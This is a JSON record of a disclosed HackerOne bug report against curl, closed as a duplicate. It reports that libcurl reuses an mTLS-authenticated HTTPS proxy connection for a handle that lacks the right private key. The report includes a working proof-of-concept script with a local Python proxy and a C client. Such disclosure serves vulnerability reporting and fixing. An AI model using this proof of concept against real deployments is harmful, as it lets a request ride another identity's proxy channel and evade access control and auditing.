@@ -1,0 +1,111 @@
+{
+  "id": 3735180,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzM1MTgw",
+  "url": "https://hackerone.com/reports/3735180",
+  "title": "HTTPS proxy connection reuse lets one easy handle inherit another handle's mTLS-authenticated proxy session",
+  "state": "Closed",
+  "substate": "duplicate",
+  "severity_rating": "medium",
+  "readable_substate": "Duplicate",
+  "created_at": "2026-05-14T11:36:14.205Z",
+  "submitted_at": "2026-05-14T11:36:14.896Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "zhenyan",
+    "url": "/zhenyan",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-24T08:31:04.386Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-24T08:30:36.784Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nlibcurl can reuse an already mTLS-authenticated HTTPS proxy TLS connection for a different easy handle even when that second handle does not have the proxy private key required to establish the session itself. The issue happens because the HTTPS proxy connection reuse identity does not include proxy client-auth fields such as `CURLOPT_PROXY_SSLKEY`, so a connection created under one handle's proxy identity can be silently reused by another handle sharing the same connection cache. In my validated PoC, handle A establishes the proxy TLS connection with the correct client key, handle B reuses that connection and successfully requests `/secret` without having the correct proxy private key, and the same request fails immediately when `CURLOPT_FRESH_CONNECT` is forced. This is not an undocumented API misuse case: shared connection caches are a documented libcurl feature and the multi interface shares the connection pool by default. The bug causes session and identity bleed across logical requests.\n\n## Affected version\nValidated locally on:\n\n`curl 8.21.0-DEV (x86_64-pc-linux-gnu) libcurl/8.21.0-DEV OpenSSL/3.0.13 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libpsl/0.21.2`\n\nFeatures included `HTTPS-proxy`.\n\n## Steps To Reproduce:\n1. From the repository root, run the following self-contained script:\n\n   ```bash\n   TMPDIR=\"$(mktemp -d)\"\n   trap 'rm -rf \"$TMPDIR\"' EXIT\n   CERTDIR=\"$TMPDIR/certs\"\n   mkdir -p \"$CERTDIR\"\n\n   cat >\"$TMPDIR/server.py\" <<'PY'\n   #!/usr/bin/env python3\n   import socket\n   import ssl\n   import sys\n\n   def recv_headers(sock, pending):\n       while b\"\\r\\n\\r\\n\" not in pending:\n           chunk = sock.recv(4096)\n           if not chunk:\n               raise EOFError\n           pending += chunk\n       head, pending = pending.split(b\"\\r\\n\\r\\n\", 1)\n       return head, pending\n\n   def main():\n       port = int(sys.argv[1])\n       cert = sys.argv[2]\n       key = sys.argv[3]\n       ca = sys.argv[4]\n\n       ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n       ctx.load_cert_chain(cert, key)\n       ctx.load_verify_locations(cafile=ca)\n       ctx.verify_mode = ssl.CERT_REQUIRED\n\n       lsock = socket.socket()\n       lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n       lsock.bind((\"127.0.0.1\", port))\n       lsock.listen(5)\n       print(f\"LISTEN {lsock.getsockname()[1]}\", flush=True)\n\n       accepts = 0\n       while True:\n           csock, addr = lsock.accept()\n           accepts += 1\n           print(f\"ACCEPT {accepts} {addr}\", flush=True)\n           try:\n               ssock = ctx.wrap_socket(csock, server_side=True)\n           except Exception as exc:\n               print(f\"HANDSHAKE_FAIL {exc!r}\", flush=True)\n               csock.close()\n               continue\n\n           subject = ssock.getpeercert().get(\"subject\", ())\n           pending = b\"\"\n           reqs = 0\n           ssock.settimeout(10)\n           try:\n               head, pending = recv_headers(ssock, pending)\n               line = head.split(b\"\\r\\n\", 1)[0].decode(\"latin1\")\n               print(f\"CONNECT {accepts} {line} subj={subject}\", flush=True)\n               ssock.sendall(\n                   b\"HTTP/1.1 200 Connection established\\r\\n\"\n                   b\"Proxy-Agent: test\\r\\n\\r\\n\"\n               )\n\n               while True:\n                   head, pending = recv_headers(ssock, pending)\n                   line = head.split(b\"\\r\\n\", 1)[0].decode(\"latin1\")\n                   reqs += 1\n                   print(f\"TUNNELREQ {accepts}.{reqs} {line}\", flush=True)\n                   body = f\"tunnel accept={accepts} req={reqs}\\n\".encode()\n                   response = (\n                       b\"HTTP/1.1 200 OK\\r\\n\"\n                       + f\"Content-Length: {len(body)}\\r\\n\".encode()\n                       + b\"Content-Type: text/plain\\r\\n\"\n                       + b\"Connection: keep-alive\\r\\n\\r\\n\"\n                       + body\n                   )\n                   ssock.sendall(response)\n           except Exception as exc:\n               print(f\"CLOSE {accepts} {type(exc).__name__}\", flush=True)\n           finally:\n               try:\n                   ssock.close()\n               except Exception:\n                   pass\n\n   if __name__ == \"__main__\":\n       main()\n   PY\n\n   cat >\"$TMPDIR/client.c\" <<'EOF'\n   #include <curl/curl.h>\n   #include <stdio.h>\n   #include <string.h>\n\n   struct response { char data[4096]; size_t len; };\n\n   static size_t sink(char *ptr, size_t size, size_t nmemb, void *userdata) {\n     struct response *resp = userdata;\n     size_t total = size * nmemb;\n     size_t avail = sizeof(resp->data) - resp->len - 1;\n     if(total > avail)\n       total = avail;\n     memcpy(resp->data + resp->len, ptr, total);\n     resp->len += total;\n     resp->data[resp->len] = '\\0';\n     return size * nmemb;\n   }\n\n   static CURLcode do_req(CURL *easy, const char *label, struct response *resp) {\n     CURLcode rc;\n     resp->len = 0;\n     resp->data[0] = '\\0';\n     fprintf(stderr, \"\\n== %s ==\\n\", label);\n     rc = curl_easy_perform(easy);\n     if(rc == CURLE_OK) {\n       long code = 0;\n       curl_easy_getinfo(easy, CURLINFO_RESPONSE_CODE, &code);\n       fprintf(stderr, \"%s: success http=%ld body=%s\", label, code, resp->data);\n     }\n     else {\n       fprintf(stderr, \"%s: failed %d (%s)\\n\", label, (int)rc,\n               curl_easy_strerror(rc));\n     }\n     return rc;\n   }\n\n   static CURL *easy_init_common(CURLSH *share, const char *url,\n                                 const char *proxy_url, const char *proxy_ca,\n                                 const char *client_cert, const char *client_key,\n                                 struct response *resp) {\n     CURL *easy = curl_easy_init();\n     if(!easy)\n       return NULL;\n     curl_easy_setopt(easy, CURLOPT_SHARE, share);\n     curl_easy_setopt(easy, CURLOPT_URL, url);\n     curl_easy_setopt(easy, CURLOPT_PROXY, proxy_url);\n     curl_easy_setopt(easy, CURLOPT_HTTPPROXYTUNNEL, 1L);\n     curl_easy_setopt(easy, CURLOPT_PROXY_CAINFO, proxy_ca);\n     curl_easy_setopt(easy, CURLOPT_PROXY_SSLCERT, client_cert);\n     curl_easy_setopt(easy, CURLOPT_PROXY_SSLKEY, client_key);\n     curl_easy_setopt(easy, CURLOPT_PROXY_SSL_VERIFYPEER, 1L);\n     curl_easy_setopt(easy, CURLOPT_PROXY_SSL_VERIFYHOST, 2L);\n     curl_easy_setopt(easy, CURLOPT_VERBOSE, 1L);\n     curl_easy_setopt(easy, CURLOPT_WRITEFUNCTION, sink);\n     curl_easy_setopt(easy, CURLOPT_WRITEDATA, resp);\n     return easy;\n   }\n\n   int main(int argc, char **argv) {\n     CURLcode rc = CURLE_OK;\n     CURL *priv = NULL, *unpriv = NULL;\n     CURLSH *share = NULL;\n     struct response resp;\n     char proxy_url[256];\n\n     if(argc != 6)\n       return 2;\n\n     snprintf(proxy_url, sizeof(proxy_url), \"https://localhost:%s\", argv[1]);\n     curl_global_init(CURL_GLOBAL_DEFAULT);\n     share = curl_share_init();\n     curl_share_setopt(share, CURLSHOPT_SHARE, CURL_LOCK_DATA_CONNECT);\n\n     priv = easy_init_common(share, \"http://example.com/bootstrap\",\n                             proxy_url, argv[2], argv[3], argv[4], &resp);\n     rc = do_req(priv, \"priv_handle_req1_bootstrap\", &resp);\n     if(rc) goto out;\n\n     unpriv = easy_init_common(share, \"http://example.com/secret\",\n                               proxy_url, argv[2], argv[3], argv[5], &resp);\n     rc = do_req(unpriv, \"unpriv_handle_req2_secret_reuse_allowed\", &resp);\n     if(rc) goto out;\n\n     curl_easy_setopt(unpriv, CURLOPT_FRESH_CONNECT, 1L);\n     rc = do_req(unpriv, \"unpriv_handle_req3_secret_fresh_connect\", &resp);\n\n   out:\n     if(unpriv) curl_easy_cleanup(unpriv);\n     if(priv) curl_easy_cleanup(priv);\n     if(share) curl_share_cleanup(share);\n     curl_global_cleanup();\n     return (int)rc;\n   }\n   EOF\n\n   cc \"$TMPDIR/client.c\" -o \"$TMPDIR/client\" -lcurl\n\n   openssl req -x509 -newkey rsa:2048 -nodes \\\n     -keyout \"$CERTDIR/ca.key\" -out \"$CERTDIR/ca.crt\" -days 1 \\\n     -subj '/CN=proxy-reuse-ca' >/dev/null 2>&1\n   openssl req -newkey rsa:2048 -nodes \\\n     -keyout \"$CERTDIR/proxy.key\" -out \"$CERTDIR/proxy.csr\" \\\n     -subj '/CN=localhost' \\\n     -addext 'subjectAltName=DNS:localhost,IP:127.0.0.1' >/dev/null 2>&1\n   openssl x509 -req -in \"$CERTDIR/proxy.csr\" -CA \"$CERTDIR/ca.crt\" \\\n     -CAkey \"$CERTDIR/ca.key\" -CAcreateserial -out \"$CERTDIR/proxy.crt\" \\\n     -days 1 -copy_extensions copy >/dev/null 2>&1\n   openssl req -newkey rsa:2048 -nodes \\\n     -keyout \"$CERTDIR/client.key\" -out \"$CERTDIR/client.csr\" \\\n     -subj '/CN=proxy-mtls-client' \\\n     -addext 'extendedKeyUsage=clientAuth' >/dev/null 2>&1\n   openssl x509 -req -in \"$CERTDIR/client.csr\" -CA \"$CERTDIR/ca.crt\" \\\n     -CAkey \"$CERTDIR/ca.key\" -CAcreateserial -out \"$CERTDIR/client.crt\" \\\n     -days 1 -copy_extensions copy >/dev/null 2>&1\n\n   python3 -u \"$TMPDIR/server.py\" 0 \"$CERTDIR/proxy.crt\" \"$CERTDIR/proxy.key\" \\\n     \"$CERTDIR/ca.crt\" >\"$TMPDIR/server.log\" 2>&1 &\n   SERVER_PID=$!\n   trap 'kill $SERVER_PID 2>/dev/null || true; rm -rf \"$TMPDIR\"' EXIT\n\n   for _ in $(seq 1 50); do\n     grep -q '^LISTEN ' \"$TMPDIR/server.log\" && break\n     sleep 0.1\n   done\n   PORT=\"$(awk '/^LISTEN / {print $2; exit}' \"$TMPDIR/server.log\")\"\n\n   \"$TMPDIR/client\" \"$PORT\" \"$CERTDIR/ca.crt\" \"$CERTDIR/client.crt\" \\\n     \"$CERTDIR/client.key\" \"$CERTDIR/proxy.key\" >\"$TMPDIR/client.log\" 2>&1 || true\n\n   cat \"$TMPDIR/client.log\"\n   echo\n   cat \"$TMPDIR/server.log\"\n   ```\n\n2. The script automatically:\n   - creates a local CA, HTTPS proxy certificate, and proxy client certificate\n   - starts a local HTTPS proxy that requires client certificates\n   - creates a shared connection cache using `CURLSHOPT_SHARE` with `CURL_LOCK_DATA_CONNECT`\n   - uses handle A with the correct proxy client certificate and private key to establish the authenticated HTTPS proxy TLS connection\n   - uses handle B with the same public certificate path but the wrong private key to request `/secret`\n   - retries handle B with `CURLOPT_FRESH_CONNECT` as a control\n\n3. Successful reproduction is shown by all of the following:\n   - client log contains:\n\n     ```text\n     Reusing existing http: connection with proxy localhost\n     ```\n\n   - proxy log shows:\n\n     ```text\n     TUNNELREQ 1.1 GET /bootstrap HTTP/1.1\n     TUNNELREQ 1.2 GET /secret HTTP/1.1\n     ```\n\n     proving that handle B's `/secret` request ran on the same already-authenticated proxy TLS connection established by handle A\n\n   - the fresh-connect control fails with:\n\n     ```text\n     unable to set private key file: '.../proxy.key' type PEM\n     ```\n\n4. Relevant code paths:\n   - proxy reuse gate: `lib/url.c:856`\n   - reuse matcher: `lib/vtls/vtls.c:194`\n   - proxy client-auth fields populated in `ssl_config_data`: `lib/vtls/vtls.c:371`\n   - only `proxy_ssl.primary` cloned onto the reusable connection object: `lib/vtls/vtls.c:405`\n\n## Impact\n\n## Summary:\nAn easy handle that does not possess the proxy private key can still send traffic through an already-authenticated HTTPS proxy TLS session created by another easy handle that shares the connection cache. In applications that use per-request or per-tenant proxy mTLS identities, this breaks logical isolation and can let a lower-privilege request inherit a higher-privilege proxy-authenticated channel. In practice, that can undermine proxy-side access control, egress policy separation, and auditing assumptions tied to the client certificate identity presented to the HTTPS proxy.",
+  "weakness": {
+    "id": 700,
+    "name": "Exposure of Data Element to Wrong Session"
+  },
+  "original_report_id": 3733910,
+  "original_report_url": "https://hackerone.com/reports/3733910",
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
